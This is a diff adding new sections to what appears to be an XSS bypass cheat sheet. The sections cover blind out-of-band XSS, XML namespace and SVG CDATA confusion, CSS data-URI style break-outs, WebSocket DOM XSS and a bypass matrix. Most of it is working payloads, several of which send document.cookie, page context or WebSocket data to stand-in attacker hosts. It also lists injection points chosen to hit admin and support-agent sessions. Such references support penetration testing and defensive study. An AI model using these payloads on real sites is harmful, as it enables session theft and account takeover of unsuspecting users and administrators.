@@ -1109,3 +1109,238 @@ eval('\152\141\166\141\163\143\162\151\160\164\072alert(1)')
 | No `object-src` directive | Plugin/object execution | `<object data="javascript:alert(1)">` |
 | `default-src 'none'` + no `form-action` | Form POST exfil | POST form to attacker (no fetch needed) |
 | `require-trusted-types-for 'script'` | Permissive policy or prototype pollution | Pollute `__proto__` to inject into TT policy |
+
+
+---
+
+## Blind XSS with Out-of-Band Exfil (XSS Hunter Pattern)
+
+**Type:** stored / reflected
+**Filter bypassed:** Standard sanitizers that don't execute payloads during validation — blind endpoints never render output to the tester
+**Bypass logic:** Blind XSS targets fields rendered in admin panels, support ticketing systems, log viewers, or email templates — contexts the attacker never sees directly. The payload phones home via external script load or fetch. XSS Hunter / Canarytokens / custom callback servers confirm execution and return full context (cookies, DOM snapshot, screenshot, IP).
+**Attack chain:** XSS in low-visibility input → fires in admin/agent browser → admin session cookie exfilled → full admin account takeover
+
+**Payload:**
+```html
+<!-- External script load — works where CSP allows external scripts -->
+"><script src="https://ATTACKER.xss.ht"></script>
+
+<!-- No-quotes variant for attribute injection -->
+"><script src=//ATTACKER.xss.ht></script>
+
+<!-- jQuery callback (if jQuery is loaded on admin panel) -->
+<script>$.getScript("//ATTACKER.xss.ht")</script>
+
+<!-- Fetch + callback with full context (no external lib needed) -->
+<img src=x onerror="
+  fetch('https://ATTACKER.com/b?'+btoa(JSON.stringify({
+    c:document.cookie,
+    u:location.href,
+    r:document.referrer,
+    t:document.title
+  })))
+">
+
+<!-- Polyglot blind XSS — works across HTML, attribute, and JS contexts -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('//ATTACKER.xss.ht')//>\x3e
+```
+
+**High-value injection points for blind XSS:**
+```
+- Contact/support form message body
+- Ticket title and description fields
+- User-Agent header (log viewers)
+- Referer header (analytics dashboards)
+- Feedback / bug report text
+- Username / display name (admin user management)
+- Shipping address line 2, company name
+- API key description / OAuth app name
+- Webhook URL field (rendered in admin without fetching)
+- Error message fields that feed into internal alerting
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; https://xsshunter.com
+
+---
+
+## XML Namespace Confusion XSS
+
+**Type:** stored / reflected
+**Filter bypassed:** XML-aware sanitizers and WAFs that block `<script>` but don't process qualified element names with custom namespace prefixes
+**Bypass logic:** XML parsers treat `prefix:localname` as a qualified name. When the namespace URI maps to XHTML (`http://www.w3.org/1999/xhtml`), browsers executing the document in an XML context interpret `<something:script>` as a real `<script>` element. Sanitizers that pattern-match on tag names without resolving namespaces miss this. Effective against XML/XHTML-served responses and SVG documents parsed as XML.
+**Attack chain:** XSS via XML namespace confusion → bypasses tag-name blacklist → script execution → cookie theft → ATO
+
+**Payload:**
+```xml
+<!-- Custom-prefixed script element in XHTML namespace -->
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.cookie)</something:script>
+
+<!-- Inside SVG — namespace declared on root, child uses prefix -->
+<svg xmlns:x="http://www.w3.org/1999/xhtml">
+  <x:script>alert(1)</x:script>
+</svg>
+
+<!-- Inside XML island (IE, legacy) -->
+<xml id="xdoc">
+  <xss:script xmlns:xss="http://www.w3.org/1999/xhtml">alert(1)</xss:script>
+</xml>
+
+<!-- Polyglot HTML+XML ambiguity -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<foo:script xmlns:foo="http://www.w3.org/1999/xhtml">alert(1)</foo:script>
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## CSS Context Break-Out via background-image Data URI
+
+**Type:** stored / reflected
+**Filter bypassed:** WAF/sanitizers that allow `<style>` blocks or CSS injection points but don't parse data URI content inside CSS property values
+**Bypass logic:** A data URI embedded in a CSS `url()` value can contain a closing `</style>` sequence (escaped as `<\/style>` to avoid JS string issues) followed by an SVG `onload` payload. When the browser renders the page, the CSS parser reads the data URI as opaque content, but the HTML parser, processing the raw source, sees `</style>` and exits the style block early — causing the `<svg/onload=...>` that follows to be interpreted as HTML and executed.
+**Attack chain:** CSS injection point → style block break-out → inline SVG → JS execution → cookie exfil → ATO
+
+**Payload:**
+```html
+<!-- Standard break-out via data URI in background-image -->
+<style>
+div {
+  background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+}
+</style>
+
+<!-- Without base64 — raw break-out -->
+<style>*{background:url('data:text/css,<\/style><img src=x onerror=alert(1)>')}</style>
+
+<!-- In CSS injection context (user controls value inside existing style block) -->
+/* injected: */ x}body{background:url("data:,<\/style><svg onload=fetch('//attacker.com/?c='+document.cookie)>")}
+```
+
+**Where to test:**
+- Custom CSS themes / user-defined style fields
+- Color picker values inserted into `<style>` blocks
+- Font URL or background image URL parameters in CSS
+- Web builders (Wix, Webflow custom CSS)
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## SVG CDATA Section Parser Confusion
+
+**Type:** stored / reflected
+**Filter bypassed:** XML-mode parsers and sanitizers that treat CDATA sections as inert character data — failing to see the script tag after the CDATA closes early
+**Bypass logic:** In XML/SVG documents, `<![CDATA[...]]>` marks a section of raw character data. If a sanitizer treats everything inside CDATA as text, it misses a pattern where the CDATA close sequence (`]]>`) appears inside the CDATA body, ending the section prematurely. The remaining content is then parsed as regular XML markup — including `<script>` tags. Works specifically in SVG documents and XML-served pages where the parser is XML-mode rather than HTML-mode.
+**Attack chain:** Stored SVG upload or XML injection → CDATA confusion bypasses sanitizer → `<script>` executed → persistent XSS → all viewers affected
+
+**Payload:**
+```xml
+<!-- Basic CDATA close confusion in SVG desc element -->
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+
+<!-- foreignObject variant -->
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(document.cookie)</script>]]></svg>
+
+<!-- title element confusion -->
+<svg><title><![CDATA[</title><script>alert(document.domain)</script>]]></svg>
+
+<!-- With actual exfil payload -->
+<svg>
+  <desc><![CDATA[</desc>
+  <script>
+    new Image().src='https://attacker.com/x?c='+encodeURIComponent(document.cookie)
+  </script>]]>
+</svg>
+```
+
+**Note:** HTML5 parsers handle CDATA differently and are generally not vulnerable to this pattern. This primarily affects XML/XHTML document modes and SVG files parsed as `image/svg+xml`.
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## WebSocket-Based DOM XSS
+
+**Type:** DOM
+**Filter bypassed:** Traditional XSS scanners that crawl HTTP request/response cycles and miss real-time WebSocket message processing; server-side sanitizers that validate HTTP input but not WebSocket frames
+**Bypass logic:** WebSocket messages received by `onmessage` handlers are often passed directly into DOM sinks (innerHTML, eval, document.write) without sanitization, because developers assume WebSocket traffic is trustworthy (same-origin) or less exposed. Attackers can inject via: (1) a stored XSS that sends a malicious WS message, (2) WebSocket hijacking from a CSRF context, (3) MitM on non-WSS connections, or (4) server-side injection where WS messages relay user-controlled data.
+**Attack chain:** WebSocket message injection → unsanitized message hits DOM sink → XSS executes → real-time session/token theft → ATO
+
+**Payload:**
+```javascript
+// Vulnerable WebSocket handler pattern (server sends user-controlled data):
+var ws = new WebSocket('wss://target.com/chat');
+ws.onmessage = function(event) {
+    document.getElementById('chat').innerHTML += event.data;  // Sink: innerHTML
+};
+
+// If attacker can send: {"msg": "<img src=x onerror=alert(1)>"}
+// → innerHTML sink fires when chat box renders the message
+
+// WebSocket CSRF hijack — read WS messages across origin via cross-origin iframe:
+// (Works on ws:// — non-encrypted — or if CORS is misconfigured for WS upgrade)
+var ws = new WebSocket('ws://victim.com/ws');
+ws.onmessage = function(e) {
+    fetch('https://attacker.com/steal?d=' + btoa(e.data));
+};
+
+// From existing XSS context — inject malicious WS message to all connected sessions:
+var ws = new WebSocket('wss://target.com/chat');
+ws.onopen = function() {
+    ws.send(JSON.stringify({
+        msg: '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'
+    }));
+};
+
+// Test for WS XSS: send HTML tags in message body via WS client (Burp WebSocket tab)
+// Payload to send as raw WS message:
+<img src=x onerror=alert(document.domain)>
+{"type":"message","body":"<svg onload=alert(1)>"}
+```
+
+**Detection steps:**
+```
+1. Open DevTools → Network → WS tab → observe message frames
+2. Find messages containing user-controlled strings reflected back
+3. Replace string with XSS payload in Burp's WebSocket repeater
+4. Check if payload reaches innerHTML / eval on receive
+5. Also check ws:// (non-TLS) for hijack potential
+```
+
+**Source:** https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Bypass Matrix (Updated 2026-05-25)
+
+### New Entries — Techniques Added 2026-05-25
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| No output to tester (blind endpoint) | Out-of-band callback (XSS Hunter) | `"><script src=//ATTACKER.xss.ht></script>` |
+| XML tag-name blacklist (`<script>`) | XML namespace prefix confusion | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |
+| `<style>` allowed, JS blocked | CSS `background-image` data URI break-out | `url("data:,<\/style><svg onload=alert(1)>")` |
+| XML sanitizer (CDATA treated as safe) | CDATA section premature close | `<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>` |
+| HTTP-only XSS scanner (misses WS) | WebSocket message injection | Send `<img src=x onerror=alert(1)>` as WS frame to `innerHTML` sink |
+| WAF on HTTP params (misses WS frames) | WS hijack for cross-origin exfil | Open WS from attacker page; relay `event.data` to attacker server |
+
+### New Sinks Documented 2026-05-25
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| `WebSocket.onmessage → innerHTML` | DOM / real-time chat | WS frames bypass HTTP WAF; often unsanitized |
+| `WebSocket.onmessage → eval` | DOM / live config push | Real-time config updates passed through eval |
+| CSS `url()` value | CSS injection | Data URI with `<\/style>` breaks out of `<style>` block |
+| XML namespaced script element | XML/SVG/XHTML | `xmlns` prefix maps to XHTML — script executes |
+
+### High-Value Blind XSS Injection Points (2026-05-25)
+
+| Injection Point | Why Valuable | Likely Victim |
+|----------------|-------------|---------------|
+| Support ticket body | Rendered in agent/admin ticket view | Support agent session |
+| User-Agent header | Logged and displayed in analytics | DevOps / admin dashboard |
+| Referer header | Shown in traffic reports | Analytics admin |
+| API key / OAuth app name | Admin billing/key management view | Platform admin |
+| Feedback / bug report form | Viewed by engineering or support | Internal employee |
+| Webhook description | Admin webhook management panel | Admin session |
